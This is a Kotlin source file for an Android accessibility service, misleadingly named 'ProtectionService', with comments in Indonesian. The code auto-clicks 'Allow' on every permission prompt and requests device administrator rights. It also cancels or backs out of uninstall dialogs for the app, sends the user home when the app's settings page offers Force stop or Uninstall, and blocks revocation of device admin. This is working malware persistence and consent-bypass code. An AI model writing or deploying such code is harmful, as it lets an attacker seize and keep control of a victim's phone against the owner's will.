package com.kztutorial99.androidconnector

import android.accessibilityservice.AccessibilityService
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class ProtectionService : AccessibilityService() {

    companion object {
        var isRunning = false

        fun isEnabled(ctx: Context): Boolean {
            val service = "${ctx.packageName}/${ProtectionService::class.java.canonicalName}"
            val enabled = android.provider.Settings.Secure.getString(
                ctx.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            return enabled.contains(service)
        }
    }

    private val handler = Handler(Looper.getMainLooper())

    // Teks tombol "Izinkan" di berbagai versi Android & Funtouch OS (Vivo)
    private val allowTexts = setOf(
        "Allow", "ALLOW",
        "Izinkan", "IZINKAN",
        "Allow all the time", "Izinkan sepanjang waktu",
        "Allow only while using the app",
        "Izinkan saat menggunakan aplikasi",
        "Hanya izinkan saat menggunakan",
        "Only this time", "Hanya kali ini",
        "While using the app",
        "Activate", "Aktifkan",
        "Lanjutkan", "Continue",
        "Accept", "Setuju"
    )

    // Kata kunci halaman Settings yang menunjukkan detail app kita
    private val settingsPkgs = setOf(
        "com.android.settings",
        "com.coloros.settings",
        "com.vivo.permissionmanager",
        "com.miui.securitycenter",
        "com.iqoo.secure",
        "com.vivo.settings"
    )

    // Package installer yang muncul saat uninstall
    private val installerPkgs = setOf(
        "com.android.packageinstaller",
        "com.google.android.packageinstaller",
        "com.vivo.packageinstaller",
        "com.coloros.packageinstaller",
        "com.miui.packageinstaller",
        "android"
    )

    override fun onServiceConnected() {
        isRunning = true
        // Setelah service aktif, langsung trigger setup otomatis
        handler.postDelayed({ triggerAutoSetup() }, 800)
    }

    override fun onInterrupt() {
        isRunning = false
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val root = event?.source ?: return
        val pkg = event.packageName?.toString() ?: return

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        ) {
            autoClickAllow(root)
            if (pkg in installerPkgs) blockUninstallDialog(root)
            if (settingsPkgs.any { pkg.contains(it) } || pkg.contains("settings", true)) {
                blockAppSettingsPage(root)
                blockDeviceAdminRevoke(root)
            }
        }
    }

    // ─── Auto-klik semua tombol "Izinkan" ────────────────────────────────────

    private fun autoClickAllow(root: AccessibilityNodeInfo) {
        for (text in allowTexts) {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            for (node in nodes) {
                if (tryClick(node)) return
                if (tryClick(node.parent)) return
            }
        }
    }

    // ─── Blokir dialog uninstall ──────────────────────────────────────────────

    private fun blockUninstallDialog(root: AccessibilityNodeInfo) {
        val uninstallWords = listOf("Uninstall", "Hapus aplikasi", "Uninstall app", "Remove app")
        val ourPkg = packageName

        val windowText = root.findAccessibilityNodeInfosByText(ourPkg)
            .isNotEmpty() || root.findAccessibilityNodeInfosByText("AndroidConnector").isNotEmpty()

        val hasUninstallWord = uninstallWords.any {
            root.findAccessibilityNodeInfosByText(it).isNotEmpty()
        }

        if (windowText || hasUninstallWord) {
            // Klik Cancel kalau ada
            listOf("Cancel", "Batal", "BATAL", "Tidak").forEach { cancel ->
                root.findAccessibilityNodeInfosByText(cancel).forEach { node ->
                    if (tryClick(node)) return
                }
            }
            // Kalau tidak ada Cancel, tekan Back
            performGlobalAction(GLOBAL_ACTION_BACK)
        }
    }

    // ─── Blokir halaman detail app di Settings ────────────────────────────────

    private fun blockAppSettingsPage(root: AccessibilityNodeInfo) {
        val hasAppName = root.findAccessibilityNodeInfosByText("AndroidConnector").isNotEmpty() ||
                root.findAccessibilityNodeInfosByText(packageName).isNotEmpty()

        val dangerWords = listOf("Force stop", "Paksa berhenti", "Uninstall", "Hapus")
        val hasDanger = dangerWords.any {
            root.findAccessibilityNodeInfosByText(it).isNotEmpty()
        }

        if (hasAppName && hasDanger) {
            performGlobalAction(GLOBAL_ACTION_HOME)
        }
    }

    // ─── Blokir pencabutan Device Admin ──────────────────────────────────────

    private fun blockDeviceAdminRevoke(root: AccessibilityNodeInfo) {
        val revokeWords = listOf(
            "Deactivate", "Nonaktifkan administrator",
            "Remove device administrator", "Hapus administrator",
            "Deactivate device administrator"
        )
        val hasRevoke = revokeWords.any {
            root.findAccessibilityNodeInfosByText(it).isNotEmpty()
        }
        if (hasRevoke) {
            performGlobalAction(GLOBAL_ACTION_BACK)
        }
    }

    // ─── Trigger setup otomatis setelah service aktif ─────────────────────────

    private fun triggerAutoSetup() {
        // Aktifkan Device Admin
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, AppDeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Diperlukan agar aplikasi tetap berjalan.")
            }
            startActivity(intent)
        }

        // Buka MainActivity untuk request permission — service akan auto-klik Allow
        handler.postDelayed({
            val intent = Intent(this, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
                putExtra("AUTO_SETUP", true)
            }
            startActivity(intent)
        }, 1500)
    }

    private fun tryClick(node: AccessibilityNodeInfo?): Boolean {
        if (node == null) return false
        return if (node.isClickable && node.isEnabled) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            true
        } else false
    }
}
